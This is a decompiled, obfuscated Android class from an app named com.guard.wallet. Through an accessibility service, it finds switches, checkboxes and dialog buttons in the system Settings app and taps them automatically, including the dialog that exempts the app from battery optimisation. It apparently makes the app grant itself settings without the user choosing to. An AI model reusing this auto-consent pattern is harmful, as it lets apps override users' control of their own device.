package o;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import com.guard.wallet.MainApplication;
import com.guard.wallet.condition.BoolCondition;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.entity.CheckedResult;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.filter.CombineFiltersWithOr;
import com.guard.wallet.req.ListenWindow;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.Collections;
import java.util.LinkedList;
import java.util.List;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;

public abstract class c extends e {
   public final ConcurrentLinkedQueue n = new ConcurrentLinkedQueue();
   public final ReentrantLock o = new ReentrantLock();
   public final ScheduledExecutorService p = Executors.newSingleThreadScheduledExecutor();
   public final AtomicBoolean q = new AtomicBoolean(false);

   public c(LinkedList var1, String var2) {
      super(var1, var2);
   }

   public static CombineFilter H(String var0) {
      CombineFilter var1 = new CombineFilter();
      StringCondition var2 = a.a.c(var1, "className", "android.widget.TextView");
      var1.getStringConditions().add(var2);
      var2 = new StringCondition();
      var2.setProperty("text");
      var2.setContains(var0);
      var1.getStringConditions().add(var2);
      return var1;
   }

   public static CombineFiltersWithOr I() {
      CombineFiltersWithOr var0 = new CombineFiltersWithOr(new LinkedList<>());
      List var1 = var0.getFilters();
      CombineFilter var3 = new CombineFilter();
      StringCondition var2 = a.a.b(var3, a.a.c(var3, "className", "android.widget.Button"), "id", "android:id/button1");
      var3.getStringConditions().add(var2);
      var1.add(var3);
      var1 = var0.getFilters();
      var3 = new CombineFilter();
      var2 = a.a.b(var3, a.a.c(var3, "className", "android.widget.Button"), "id", "com.android.settings:id/btn_positive");
      var3.getStringConditions().add(var2);
      var1.add(var3);
      return var0;
   }

   public static ListenWindow J() {
      ListenWindow var0 = new ListenWindow("com.android.settings", "android.app.Dialog");
      o.b.q(32, o.b.r(var0), var0).add(16384);
      return var0;
   }

   public static CombineFilter K() {
      CombineFilter var0 = new CombineFilter();
      StringCondition var1 = a.a.c(var0, "className", "android.widget.LinearLayout");
      var0.getStringConditions().add(var1);
      var0.setBoolConditions(new LinkedList<>());
      var0.getBoolConditions().add(new BoolCondition("clickable", true, true));
      return var0;
   }

   public static CombineFilter L() {
      CombineFilter var0 = new CombineFilter();
      var0.setBoolConditions(new LinkedList<>());
      BoolCondition var1 = new BoolCondition("clickable", true, true);
      var0.getBoolConditions().add(var1);
      return var0;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static void M() {
      if (MyAccessibilityService.P() != null) {
         AtomicReference var0 = MyAccessibilityService.v;
         if (!Objects.equals((String)var0.get(), "android.app.Dialog")) {
            MyAccessibilityService var1 = MyAccessibilityService.P();
            var1.getClass();

            label42: {
               Exception var10000;
               label50: {
                  try {
                     var9 = var1.getRootInActiveWindow();
                  } catch (Exception var4) {
                     var10000 = var4;
                     boolean var10001 = false;
                     break label50;
                  }

                  if (var9 != null) {
                     try {
                        if (var9.getClassName() != null) {
                           var6 = var9.getClassName().toString();
                           break label42;
                        }
                     } catch (Exception var3) {
                        var10000 = var3;
                        boolean var11 = false;
                        break label50;
                     }
                  }

                  try {
                     var6 = (String)var0.get();
                     break label42;
                  } catch (Exception var2) {
                     var10000 = var2;
                     boolean var12 = false;
                  }
               }

               Exception var5 = var10000;
               a1.q.s("MyAccessibilityService", var5);
               var6 = null;
            }

            if (!Objects.equals(var6, "android.app.Dialog")) {
               return;
            }
         }

         MyAccessibilityService var10 = MyAccessibilityService.P();
         CombineFilter var7 = N();
         var10.getClass();
         UiObject var8 = MyAccessibilityService.M(var7);
         if (var8 != null && var8.click()) {
            Log.d("o.c", "已点击对话框取消按钮");
            com.guard.wallet.utils.g.T0(5);
         }
      }
   }

   public static CombineFilter N() {
      CombineFilter var0 = new CombineFilter();
      StringCondition var1 = a.a.b(var0, a.a.c(var0, "className", "android.widget.Button"), "id", "android:id/button1");
      var0.getStringConditions().add(var1);
      return var0;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static CheckedResult P(UiObject var0) {
      CheckedResult var8 = new CheckedResult();
      boolean var3 = false;
      boolean var4 = false;

      label196: {
         boolean var34;
         label195: {
            label200: {
               label193: {
                  Exception var10000;
                  label201: {
                     CombineFilter var9;
                     try {
                        var9 = new CombineFilter();
                        LinkedList var6 = new LinkedList();
                        var9.setStringConditions(var6);
                        StringCondition var35 = new StringCondition();
                        var35.setProperty("className");
                        var35.setEquals("android.widget.CompoundButton");
                        var9.getStringConditions().add(var35);
                        MyAccessibilityService.I(var0);
                     } catch (Exception var27) {
                        var10000 = var27;
                        boolean var10001 = false;
                        break label201;
                     }

                     Object var7 = null;
                     int var1 = 0;
                     UiObject var36 = var0;

                     for (var0 = (UiObject)var7; var36 != null && var0 == null && var1 <= 2; var1++) {
                        try {
                           var0 = var36.findOneByCombine(var9);
                           var36 = var36.parent();
                        } catch (Exception var26) {
                           var10000 = var26;
                           boolean var39 = false;
                           break label201;
                        }
                     }

                     if (var0 == null) {
                        break label196;
                     }

                     try {
                        var34 = var0.checked();
                        break label193;
                     } catch (Exception var25) {
                        var10000 = var25;
                        boolean var40 = false;
                     }
                  }

                  var29 = var10000;
                  var3 = var4;
                  break label200;
               }

               Exception var38;
               label208: {
                  int var30;
                  int var2 = 5;
                  var30 = var2;
                  var4 = var34;
                  label168:
                  if (!var34) {
                     var3 = var34;
                     var30 = var2;
                     var4 = var34;

                     try {
                        if (!var0.click()) {
                           break label168;
                        }
                     } catch (Exception var24) {
                        var38 = var24;
                        boolean var41 = false;
                        break label208;
                     }

                     var3 = var34;

                     try {
                        var8.setClicked(true);
                     } catch (Exception var23) {
                        var38 = var23;
                        boolean var42 = false;
                        break label208;
                     }

                     var3 = var34;

                     try {
                        var0.refresh();
                     } catch (Exception var22) {
                        var38 = var22;
                        boolean var43 = false;
                        break label208;
                     }

                     var3 = var34;

                     try {
                        var34 = var0.checked();
                     } catch (Exception var21) {
                        var38 = var21;
                        boolean var44 = false;
                        break label208;
                     }

                     while (true) {
                        var30 = var2;
                        var4 = var34;
                        if (var2 <= 0) {
                           break;
                        }

                        var30 = var2;
                        var4 = var34;
                        if (var34) {
                           break;
                        }

                        var3 = var34;

                        try {
                           com.guard.wallet.utils.g.T0(1);
                        } catch (Exception var20) {
                           var38 = var20;
                           boolean var45 = false;
                           break label208;
                        }

                        var3 = var34;

                        try {
                           var0.refresh();
                        } catch (Exception var19) {
                           var38 = var19;
                           boolean var46 = false;
                           break label208;
                        }

                        var3 = var34;

                        try {
                           var34 = var0.checked();
                        } catch (Exception var18) {
                           var38 = var18;
                           boolean var47 = false;
                           break label208;
                        }

                        var2--;
                     }
                  }

                  var34 = var4;
                  if (var4) {
                     break label195;
                  }

                  var3 = var4;

                  UiObject var37;
                  try {
                     var37 = var0.findParentUtilCombine(L());
                  } catch (Exception var17) {
                     var38 = var17;
                     boolean var48 = false;
                     break label208;
                  }

                  var34 = var4;
                  if (var37 == null) {
                     break label195;
                  }

                  var3 = var4;
                  var34 = var4;

                  try {
                     if (!var37.click()) {
                        break label195;
                     }
                  } catch (Exception var16) {
                     var38 = var16;
                     boolean var49 = false;
                     break label208;
                  }

                  var3 = var4;

                  try {
                     var8.setClicked(true);
                  } catch (Exception var15) {
                     var38 = var15;
                     boolean var50 = false;
                     break label208;
                  }

                  var3 = var4;

                  try {
                     var0.refresh();
                  } catch (Exception var14) {
                     var38 = var14;
                     boolean var51 = false;
                     break label208;
                  }

                  var3 = var4;

                  try {
                     var4 = var0.checked();
                  } catch (Exception var13) {
                     var38 = var13;
                     boolean var52 = false;
                     break label208;
                  }

                  while (true) {
                     var34 = var4;
                     if (var30 <= 0) {
                        break label195;
                     }

                     var34 = var4;
                     if (var4) {
                        break label195;
                     }

                     var3 = var4;

                     try {
                        com.guard.wallet.utils.g.T0(1);
                     } catch (Exception var12) {
                        var38 = var12;
                        boolean var53 = false;
                        break;
                     }

                     var3 = var4;

                     try {
                        var0.refresh();
                     } catch (Exception var11) {
                        var38 = var11;
                        boolean var54 = false;
                        break;
                     }

                     var3 = var4;

                     try {
                        var4 = var0.checked();
                     } catch (Exception var10) {
                        var38 = var10;
                        boolean var55 = false;
                        break;
                     }

                     var30--;
                  }
               }

               var29 = var38;
            }

            a1.q.s("o.c", var29);
            break label196;
         }

         var3 = var34;
      }

      var8.setChecked(var3);
      return var8;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static CheckedResult S(UiObject var0) {
      CheckedResult var5 = new CheckedResult();

      Exception var10000;
      label60: {
         CombineFilter var6;
         try {
            var6 = a0();
            MyAccessibilityService.I(var0);
         } catch (Exception var10) {
            var10000 = var10;
            boolean var10001 = false;
            break label60;
         }

         int var1 = 0;
         UiObject var4 = null;

         while (var0 != null && var4 == null && var1 <= 2) {
            try {
               var4 = var0.findOneByCombine(var6);
            } catch (Exception var9) {
               var10000 = var9;
               boolean var13 = false;
               break label60;
            }

            UiObject var3 = var0;
            if (var4 == null) {
               try {
                  var3 = var0.parent();
               } catch (Exception var8) {
                  var10000 = var8;
                  boolean var14 = false;
                  break label60;
               }
            }

            var1++;
            var0 = var3;
         }

         if (var4 == null) {
            return var5;
         }

         try {
            var5.setChecked(var4.checked());
            int var2 = var4.boundsInScreen().right;
            var1 = (int)var4.centerInScreen().getY();
            if (!var5.isChecked() && com.guard.wallet.utils.g.s(var2 - 80, var1)) {
               com.guard.wallet.utils.g.T0(5);
               var5.setClicked(true);
            }

            return var5;
         } catch (Exception var7) {
            var10000 = var7;
            boolean var15 = false;
         }
      }

      Exception var11 = var10000;
      a1.q.s("o.c", var11);
      return var5;
   }

   public static CombineFilter U() {
      CombineFilter var1 = new CombineFilter();
      StringCondition var0 = a.a.c(var1, "className", "android.widget.LinearLayout");
      var1.getStringConditions().add(var0);
      return var1;
   }

   public static CombineFiltersWithOr V() {
      CombineFiltersWithOr var0 = new CombineFiltersWithOr();
      var0.setFilters(new LinkedList<>());
      List var2 = var0.getFilters();
      CombineFilter var1 = new CombineFilter();
      var1.setStringConditions(new LinkedList<>());
      var1.setBoolConditions(new LinkedList<>());
      StringCondition var3 = new StringCondition();
      var3.setProperty("className");
      var3.setEquals("androidx.recyclerview.widget.RecyclerView");
      var1.getStringConditions().add(var3);
      BoolCondition var10 = new BoolCondition("scrollable", true, true);
      var1.getBoolConditions().add(var10);
      var2.add(var1);
      List var4 = var0.getFilters();
      CombineFilter var7 = new CombineFilter();
      var7.setStringConditions(new LinkedList<>());
      var7.setBoolConditions(new LinkedList<>());
      var3 = new StringCondition();
      var3.setProperty("className");
      var3.setEquals("android.widget.ListView");
      var7.getStringConditions().add(var3);
      BoolCondition var12 = new BoolCondition("scrollable", true, true);
      var7.getBoolConditions().add(var12);
      var4.add(var7);
      List var5 = var0.getFilters();
      CombineFilter var8 = new CombineFilter();
      var8.setStringConditions(new LinkedList<>());
      var8.setBoolConditions(new LinkedList<>());
      var3 = new StringCondition();
      var3.setProperty("className");
      var3.setEquals("android.widget.ScrollView");
      var8.getStringConditions().add(var3);
      BoolCondition var14 = new BoolCondition("scrollable", true, true);
      var8.getBoolConditions().add(var14);
      var5.add(var8);
      List var15 = var0.getFilters();
      CombineFilter var9 = new CombineFilter();
      var9.setBoolConditions(new LinkedList<>());
      BoolCondition var6 = new BoolCondition("scrollable", true, true);
      var9.getBoolConditions().add(var6);
      var15.add(var9);
      return var0;
   }

   public static void W() {
      if (MainApplication.getInstance() != null) {
         MainApplication.getInstance().offerStrategyEvent("PREPARE_FOR_APP_CONFIRM_LOCK");
      }
   }

   public static boolean Y() {
      try {
         M();
         if (!com.guard.wallet.utils.g.o0() && a1.q.A()) {
            com.guard.wallet.utils.g.j0();
            return true;
         }
      } catch (Exception var1) {
         a1.q.s("o.c", var1);
      }

      return false;
   }

   public static CombineFilter a0() {
      CombineFilter var0 = new CombineFilter();
      StringCondition var1 = a.a.c(var0, "className", "android.widget.Switch");
      var0.getStringConditions().add(var1);
      return var0;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final CheckedResult O(UiObject var1, int var2) {
      CheckedResult var7 = new CheckedResult();
      boolean var5 = false;
      boolean var3 = false;
      boolean var4 = var3;

      label261: {
         Exception var10000;
         label265: {
            CombineFiltersWithOr var8;
            try {
               var8 = new CombineFiltersWithOr();
            } catch (Exception var39) {
               var10000 = var39;
               boolean var10001 = false;
               break label265;
            }

            var4 = var3;

            try {
               // [VF-FIX] var8./* $VF: Unable to resugar constructor */<init>();
            } catch (Exception var38) {
               var10000 = var38;
               boolean var47 = false;
               break label265;
            }

            var4 = var3;

            LinkedList var6;
            try {
               var6 = new LinkedList();
            } catch (Exception var37) {
               var10000 = var37;
               boolean var48 = false;
               break label265;
            }

            var4 = var3;

            try {
               // [VF-FIX] var6./* $VF: Unable to resugar constructor */<init>();
            } catch (Exception var36) {
               var10000 = var36;
               boolean var49 = false;
               break label265;
            }

            var4 = var3;

            try {
               var8.setFilters(var6);
            } catch (Exception var35) {
               var10000 = var35;
               boolean var50 = false;
               break label265;
            }

            var4 = var3;

            try {
               var8.getFilters().add(a0());
            } catch (Exception var34) {
               var10000 = var34;
               boolean var51 = false;
               break label265;
            }

            var4 = var3;

            try {
               var44 = var8.getFilters();
            } catch (Exception var33) {
               var10000 = var33;
               boolean var52 = false;
               break label265;
            }

            var4 = var3;

            CombineFilter var9;
            try {
               var9 = new CombineFilter();
            } catch (Exception var32) {
               var10000 = var32;
               boolean var53 = false;
               break label265;
            }

            var4 = var3;

            try {
               // [VF-FIX] var9./* $VF: Unable to resugar constructor */<init>();
            } catch (Exception var31) {
               var10000 = var31;
               boolean var54 = false;
               break label265;
            }

            var4 = var3;

            LinkedList var10;
            try {
               var10 = new LinkedList();
            } catch (Exception var30) {
               var10000 = var30;
               boolean var55 = false;
               break label265;
            }

            var4 = var3;

            try {
               // [VF-FIX] var10./* $VF: Unable to resugar constructor */<init>();
            } catch (Exception var29) {
               var10000 = var29;
               boolean var56 = false;
               break label265;
            }

            var4 = var3;

            try {
               var9.setStringConditions(var10);
            } catch (Exception var28) {
               var10000 = var28;
               boolean var57 = false;
               break label265;
            }

            var4 = var3;

            try {
               var46 = new StringCondition();
            } catch (Exception var27) {
               var10000 = var27;
               boolean var58 = false;
               break label265;
            }

            var4 = var3;

            try {
               // [VF-FIX] var46./* $VF: Unable to resugar constructor */<init>();
            } catch (Exception var26) {
               var10000 = var26;
               boolean var59 = false;
               break label265;
            }

            var4 = var3;

            try {
               var46.setProperty("className");
            } catch (Exception var25) {
               var10000 = var25;
               boolean var60 = false;
               break label265;
            }

            var4 = var3;

            try {
               var46.setEquals("android.widget.CheckBox");
            } catch (Exception var24) {
               var10000 = var24;
               boolean var61 = false;
               break label265;
            }

            var4 = var3;

            try {
               var9.getStringConditions().add(var46);
            } catch (Exception var23) {
               var10000 = var23;
               boolean var62 = false;
               break label265;
            }

            var4 = var3;

            try {
               var44.add(var9);
            } catch (Exception var22) {
               var10000 = var22;
               boolean var63 = false;
               break label265;
            }

            var4 = var3;

            try {
               MyAccessibilityService.I(var1);
            } catch (Exception var21) {
               var10000 = var21;
               boolean var64 = false;
               break label265;
            }

            UiObject var45 = null;

            for (int var41 = 0; var1 != null && var45 == null && var41 <= 2; var41++) {
               var4 = var3;

               try {
                  var45 = var1.findOneByOperateOr(var8);
               } catch (Exception var20) {
                  var10000 = var20;
                  boolean var65 = false;
                  break label265;
               }

               var4 = var3;

               try {
                  var1 = var1.parent();
               } catch (Exception var19) {
                  var10000 = var19;
                  boolean var66 = false;
                  break label265;
               }
            }

            var4 = var5;
            if (var45 == null) {
               break label261;
            }

            var4 = var3;

            try {
               Log.d("o.c", "checkboxNode is not null");
            } catch (Exception var18) {
               var10000 = var18;
               boolean var67 = false;
               break label265;
            }

            var4 = var3;

            try {
               var3 = var45.checked();
            } catch (Exception var17) {
               var10000 = var17;
               boolean var68 = false;
               break label265;
            }

            var2 = 0;

            while (true) {
               var4 = var3;
               if (var3) {
                  break label261;
               }

               var4 = var3;
               if (var2 >= 5) {
                  break label261;
               }

               var4 = var3;

               try {
                  var45.click();
               } catch (Exception var16) {
                  var10000 = var16;
                  boolean var69 = false;
                  break;
               }

               var4 = var3;

               try {
                  Log.d("o.c", "checkboxNode is click");
               } catch (Exception var15) {
                  var10000 = var15;
                  boolean var70 = false;
                  break;
               }

               var4 = var3;

               try {
                  var7.setClicked(true);
               } catch (Exception var14) {
                  var10000 = var14;
                  boolean var71 = false;
                  break;
               }

               var4 = var3;

               try {
                  com.guard.wallet.utils.g.T0(5);
               } catch (Exception var13) {
                  var10000 = var13;
                  boolean var72 = false;
                  break;
               }

               var4 = var3;

               try {
                  var45.refresh();
               } catch (Exception var12) {
                  var10000 = var12;
                  boolean var73 = false;
                  break;
               }

               var4 = var3;

               try {
                  var3 = var45.checked();
               } catch (Exception var11) {
                  var10000 = var11;
                  boolean var74 = false;
                  break;
               }

               var2++;
            }
         }

         Exception var40 = var10000;
         a1.q.s("o.c", var40);
      }

      var7.setChecked(var4);
      return var7;
   }

   public final UiObject Q() {
      try {
         CombineFiltersWithOr var1 = V();
         if (this.k() != null) {
            return this.k().findOneByOperateOr(var1);
         }
      } catch (Exception var2) {
         a1.q.s("o.c", var2);
      }

      return null;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final CheckedResult R(UiObject var1, int var2) {
      CheckedResult var11 = new CheckedResult();
      boolean var7 = false;
      boolean var8 = false;
      boolean var6 = var8;

      label230: {
         Exception var10000;
         label234: {
            CombineFilter var12;
            try {
               var12 = a0();
            } catch (Exception var35) {
               var10000 = var35;
               boolean var10001 = false;
               break label234;
            }

            var6 = var8;

            try {
               MyAccessibilityService.I(var1);
            } catch (Exception var34) {
               var10000 = var34;
               boolean var47 = false;
               break label234;
            }

            UiObject var10 = null;
            int var3 = 0;
            UiObject var9 = var1;
            var1 = var10;

            while (var9 != null && var1 == null && var3 <= 2) {
               var6 = var8;

               try {
                  var1 = var9.findOneByCombine(var12);
               } catch (Exception var33) {
                  var10000 = var33;
                  boolean var48 = false;
                  break label234;
               }

               var10 = var9;
               if (var1 == null) {
                  var6 = var8;

                  try {
                     var10 = var9.parent();
                  } catch (Exception var32) {
                     var10000 = var32;
                     boolean var49 = false;
                     break label234;
                  }
               }

               var3++;
               var9 = (UiObject)var10;
            }

            if (var1 == null) {
               break label230;
            }

            var6 = var8;

            try {
               var7 = var1.checked();
            } catch (Exception var31) {
               var10000 = var31;
               boolean var50 = false;
               break label234;
            }

            var6 = var7;

            int var5;
            try {
               var5 = var1.boundsInScreen().right;
            } catch (Exception var30) {
               var10000 = var30;
               boolean var51 = false;
               break label234;
            }

            var6 = var7;

            int var4;
            try {
               var4 = (int)var1.centerInScreen().getY();
            } catch (Exception var29) {
               var10000 = var29;
               boolean var52 = false;
               break label234;
            }

            var8 = var7;
            var10 = var1;
            var3 = var2;
            label191:
            if (!var7) {
               var8 = var7;
               var10 = var1;
               var3 = var2;
               var6 = var7;

               try {
                  if (!com.guard.wallet.utils.g.s(var5 - 50, var4)) {
                     break label191;
                  }
               } catch (Exception var28) {
                  var10000 = var28;
                  boolean var53 = false;
                  break label234;
               }

               var6 = var7;

               try {
                  var11.setClicked(true);
               } catch (Exception var27) {
                  var10000 = var27;
                  boolean var54 = false;
                  break label234;
               }

               var6 = var7;

               try {
                  MyAccessibilityService.I(this.k());
               } catch (Exception var26) {
                  var10000 = var26;
                  boolean var55 = false;
                  break label234;
               }

               var6 = var7;

               try {
                  var1 = var9.findOneByCombine(var12);
               } catch (Exception var25) {
                  var10000 = var25;
                  boolean var56 = false;
                  break label234;
               }

               var6 = var7;

               try {
                  var7 = var1.checked();
               } catch (Exception var24) {
                  var10000 = var24;
                  boolean var57 = false;
                  break label234;
               }

               while (true) {
                  var8 = var7;
                  var10 = var1;
                  var3 = var2;
                  if (var2 <= 0) {
                     break;
                  }

                  var8 = var7;
                  var10 = var1;
                  var3 = var2;
                  if (var7) {
                     break;
                  }

                  var6 = var7;

                  try {
                     com.guard.wallet.utils.g.T0(1);
                  } catch (Exception var23) {
                     var10000 = var23;
                     boolean var58 = false;
                     break label234;
                  }

                  var6 = var7;

                  try {
                     var1 = var9.findOneByCombine(var12);
                  } catch (Exception var22) {
                     var10000 = var22;
                     boolean var59 = false;
                     break label234;
                  }

                  var6 = var7;

                  try {
                     var7 = var1.checked();
                  } catch (Exception var21) {
                     var10000 = var21;
                     boolean var60 = false;
                     break label234;
                  }

                  var2--;
               }
            }

            var7 = var8;
            if (var8) {
               break label230;
            }

            var6 = var8;

            try {
               var1 = var10.findParentUtilCombine(L());
            } catch (Exception var20) {
               var10000 = var20;
               boolean var61 = false;
               break label234;
            }

            var7 = var8;
            if (var1 == null) {
               break label230;
            }

            var6 = var8;
            var7 = var8;

            try {
               if (!var1.click()) {
                  break label230;
               }
            } catch (Exception var19) {
               var10000 = var19;
               boolean var62 = false;
               break label234;
            }

            var6 = var8;

            try {
               var11.setClicked(true);
            } catch (Exception var18) {
               var10000 = var18;
               boolean var63 = false;
               break label234;
            }

            var6 = var8;

            try {
               var10.refresh();
            } catch (Exception var17) {
               var10000 = var17;
               boolean var64 = false;
               break label234;
            }

            var6 = var8;

            try {
               var8 = var10.checked();
            } catch (Exception var16) {
               var10000 = var16;
               boolean var65 = false;
               break label234;
            }

            while (true) {
               var7 = var8;
               if (var3 <= 0) {
                  break label230;
               }

               var7 = var8;
               if (var8) {
                  break label230;
               }

               var6 = var8;

               try {
                  com.guard.wallet.utils.g.T0(1);
               } catch (Exception var15) {
                  var10000 = var15;
                  boolean var66 = false;
                  break;
               }

               var6 = var8;

               try {
                  var10.refresh();
               } catch (Exception var14) {
                  var10000 = var14;
                  boolean var67 = false;
                  break;
               }

               var6 = var8;

               try {
                  var8 = var10.checked();
               } catch (Exception var13) {
                  var10000 = var13;
                  boolean var68 = false;
                  break;
               }

               var3--;
            }
         }

         Exception var39 = var10000;
         a1.q.s("o.c", var39);
         var7 = var6;
      }

      var11.setChecked(var7);
      return var11;
   }

   public final boolean T() {
      return this.q.get();
   }

   public final void X() {
      this.q.set(true);
   }

   public abstract void Z();

   @Override
   public final void d() {
      try {
         this.p.shutdownNow();
         com.guard.wallet.thread.l.a(super.c);
         this.n.clear();
         super.d();
      } catch (Exception var2) {
         a1.q.s("o.c", var2);
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   @Override
   public void u(AccessibilityEvent var1, String var2, String var3) {
      Exception var10000;
      label48: {
         try {
            super.u(var1, var2, var3);
         } catch (Exception var8) {
            var10000 = var8;
            boolean var10001 = false;
            break label48;
         }

         boolean var4;
         label41: {
            label40: {
               try {
                  if (this.q(Collections.singletonList(J()))) {
                     Log.d("o.c", "已进入是否允许忽略电池优化窗口");
                     break label40;
                  }
               } catch (Exception var7) {
                  Exception var9 = var7;

                  try {
                     a1.q.s("o.c", var9);
                  } catch (Exception var6) {
                     var10000 = var6;
                     boolean var13 = false;
                     break label48;
                  }
               }

               var4 = false;
               break label41;
            }

            var4 = true;
         }

         if (!var4) {
            return;
         }

         ConcurrentLinkedQueue var10 = this.n;

         try {
            if (!var10.contains("keepInBatteryUnRestricted")) {
               var10.add("keepInBatteryUnRestricted");
               a var12 = new a(this, 0);
               com.guard.wallet.thread.l.c(var12, super.c);
            }

            return;
         } catch (Exception var5) {
            var10000 = var5;
            boolean var14 = false;
         }
      }

      Exception var11 = var10000;
      a1.q.s("o.c", var11);
   }
}
